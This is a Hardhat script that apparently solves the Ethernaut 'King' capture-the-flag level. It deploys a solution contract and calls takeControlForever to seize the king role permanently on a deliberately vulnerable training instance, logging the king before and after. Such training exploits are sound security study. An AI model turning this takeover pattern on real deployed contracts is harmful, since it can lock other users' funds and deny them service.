import { ethers } from "hardhat";
import { ETHERNAUT_ABI, ETHERNAUT_ADDRESS } from "./constants";

const INSTANCE_ADDRESS = "0xff78E896367E61A2356051C6239B3378BF042910";

async function main() {
  const [me] = await ethers.getSigners();
  // Hardhat always runs the compile task when running scripts with its command
  // line interface.
  //
  // If this script is run directly using `node` you may want to call compile
  // manually to make sure everything is compiled
  // await hre.run('compile');

  // We get the contract to deploy
  const ethernaut = await ethers.getContractAt(
    ETHERNAUT_ABI,
    ETHERNAUT_ADDRESS
  );

  const Contract = await ethers.getContractFactory("King");
  const contract = await Contract.attach(INSTANCE_ADDRESS);

  await contract.deployed();

  // with contract - does not pass level though as the new owner address is different
  const Solution = await ethers.getContractFactory("Level9Solution");
  const solution = await Solution.deploy(contract.address);
  await solution.deployed();

  console.log("Starting _king: ", await contract._king());

  const startPrize = await ethers.utils.formatEther(await contract.prize());

  console.log(`Starting prize: ${startPrize} ether`);

  await solution.takeControlForever({
    value: ethers.utils.parseEther(startPrize),
  });

  console.log("Ending _king: ", await contract._king());

  /**
   * Uncomment the below to automatically submit the level instance, you will have to refresh the ethernaut page and will not see the pretty level completed message.
   * I suggest submittin the instance on the ethernaut website.
   * I only did this for my own personal satisfaction
   */
  // submit level instance
  // const tx = await ethernaut.submitLevelInstance(INSTANCE_ADDRESS);
  // const rc = await tx.wait();
  // console.log(rc);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
